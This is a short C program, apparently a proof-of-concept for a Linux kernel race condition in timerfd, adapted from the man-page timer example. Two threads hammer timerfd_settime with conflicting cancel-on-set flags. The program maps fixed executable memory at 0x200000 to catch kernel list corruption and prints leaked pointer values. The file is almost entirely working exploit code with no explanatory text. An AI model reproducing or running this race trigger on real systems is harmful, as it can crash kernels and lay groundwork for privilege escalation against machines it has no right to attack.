#define _GNU_SOURCE

#include <netinet/ip.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>

#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <sys/timerfd.h>
#include <time.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>        /* Definition of uint64_t */

#define handle_error(msg)                             \
    do { perror(msg); exit(EXIT_FAILURE); } while (0)

static void print_elapsed_time(void)
{
    static struct timespec start;
    struct timespec curr;
    static int first_call = 1;
    int secs, nsecs;

    if (first_call) {
        first_call = 0;
        if (clock_gettime(CLOCK_MONOTONIC, &start) == -1)
            handle_error("clock_gettime");
    }

    if (clock_gettime(CLOCK_MONOTONIC, &curr) == -1)
        handle_error("clock_gettime");

    secs = curr.tv_sec - start.tv_sec;
    nsecs = curr.tv_nsec - start.tv_nsec;
    if (nsecs < 0) {
        secs--;
        nsecs += 1000000000;
    }
    printf("%d.%03d: ", secs, (nsecs + 500000) / 1000000);
}
//

struct itimerspec new_value;

void* runbug(void* param)
{
    while(1)
        {
            timerfd_settime((int)param, 3, &new_value, NULL);
        }
}

int main(int argc, char *argv[])
{
    int mybudder = 0;
    int max_exp, fd;
    struct timespec now;
    uint64_t exp, tot_exp;
    ssize_t s;

    if ((argc != 2) && (argc != 4)) {
        fprintf(stderr, "%s init-secs [interval-secs max-exp]\n",
                argv[0]);
        exit(EXIT_FAILURE);
    }

    char* mybuffer  = (char*)mmap((void*)0x200000,0x10000,PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS, -1, 0);

    printf("mybuffer = %x,\r\n", mybuffer );

    *(int*)(mybuffer + 0x200) = &mybudder;

    if (clock_gettime(CLOCK_REALTIME, &now) == -1)
        handle_error("clock_gettime");



    new_value.it_value.tv_sec = now.tv_sec + atoi(argv[1]);
    new_value.it_value.tv_nsec = now.tv_nsec;
    if (argc == 2) {
        new_value.it_interval.tv_sec = 0;
        max_exp = 1;
    } else {
        new_value.it_interval.tv_sec = atoi(argv[2]);
        max_exp = atoi(argv[3]);
    }
    new_value.it_interval.tv_nsec = 0;

    fd = timerfd_create(CLOCK_REALTIME, TFD_NONBLOCK);
    if (fd == -1)
        handle_error("timerfd_create");

		int threads = 0;
		if ( pthread_create( &threads, NULL , runbug , fd ) )
        {
            perror( "pthread_create is error\r\n" );
            return -1;
        }

		while(!mybudder)
        {
            if (timerfd_settime(fd, 1, &new_value, NULL) == -1)
                perror("timerfd_settime");
            if( *(int*)(mybuffer + 0x200) != &mybudder)
                {

                    printf("%x %x\r\n",*(int*)(mybuffer + 0x200) , *(int*)(mybuffer + 0x204));
                    sleep(100);
                }
        }
    /*
      printf("timer started\n");

      print_elapsed_time();
      printf("timer started\n");

      for (tot_exp = 0; tot_exp < max_exp;) {
      s = read(fd, &exp, sizeof(uint64_t));
      if (s != sizeof(uint64_t))
      handle_error("read");

      tot_exp += exp;
      print_elapsed_time();
      printf("read: %llu; total=%llu\n",
      (unsigned long long) exp,
      (unsigned long long) tot_exp);
      }
    */
    exit(EXIT_SUCCESS);
}
